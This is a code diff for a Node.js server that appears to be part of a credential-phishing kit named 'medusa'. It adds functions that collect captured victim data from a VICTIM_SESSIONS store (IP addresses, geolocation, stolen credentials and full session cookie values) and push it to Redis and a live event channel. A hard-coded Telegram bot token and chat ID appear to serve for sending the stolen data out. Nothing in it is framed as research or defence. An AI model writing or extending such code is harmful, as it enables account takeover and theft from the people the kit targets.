@@ -8,6 +8,67 @@ const crypto = require("crypto");
 const Redis = require("ioredis");
 const redis = new Redis(process.env.REDIS_URL || "redis://localhost:6379");
 redis.on("error", (err) => console.error("[REDIS ERROR]", err.message));
+
+// ==================== DASHBOARD INTEGRATION ====================
+const DASHBOARD_REDIS_PREFIX = "medusa:session:";
+const DASHBOARD_EVENTS_CHANNEL = "medusa:events";
+
+function getSessionSummary(sessionId) {
+    const s = VICTIM_SESSIONS[sessionId];
+    if (!s) return null;
+    return {
+        sessionId,
+        ip: s.ip || null,
+        userAgent: s.userAgent || null,
+        geo: s.geo || null,
+        host: s.host || null,
+        hostname: s.hostname || null,
+        protocol: s.protocol || null,
+        path: s.path || null,
+        status: s.status || "active",
+        credentials: s.credentials || null,
+        cookieCount: s.cookies ? s.cookies.length : 0,
+        cookies: s.cookies ? s.cookies.map(c => ({
+            name: c.name,
+            domain: c.domain,
+            path: c.path,
+            expires: c.expires,
+            value: c.value
+        })) : [],
+        alerted: s.alerted || false,
+        captchaPassed: s.captchaPassed || false,
+        createdAt: s.createdAt || Date.now()
+    };
+}
+
+async function saveSessionToRedis(sessionId) {
+    const summary = getSessionSummary(sessionId);
+    if (!summary) return;
+    try {
+        await redis.set(
+            `${DASHBOARD_REDIS_PREFIX}${sessionId}`,
+            JSON.stringify(summary),
+            "EX",
+            60 * 60 * 24 // keep for 24 hours
+        );
+    } catch (err) {
+        console.error("[DASHBOARD] Failed to save session to Redis:", err.message);
+    }
+}
+
+async function publishDashboardEvent(type, sessionId, extra = {}) {
+    try {
+        const event = {
+            type,
+            sessionId,
+            timestamp: Date.now(),
+            ...extra
+        };
+        await redis.publish(DASHBOARD_EVENTS_CHANNEL, JSON.stringify(event));
+    } catch (err) {
+        console.error("[DASHBOARD] Failed to publish event:", err.message);
+    }
+}
 // ==================== TELEGRAM CONFIGURATION ====================
 const TELEGRAM_BOT_TOKEN = '8986334659:AAGtVf_vgVHkvXVKNP1xf3KcnCEN-QCHsk8';
 const TELEGRAM_CHAT_ID = '8531631021';
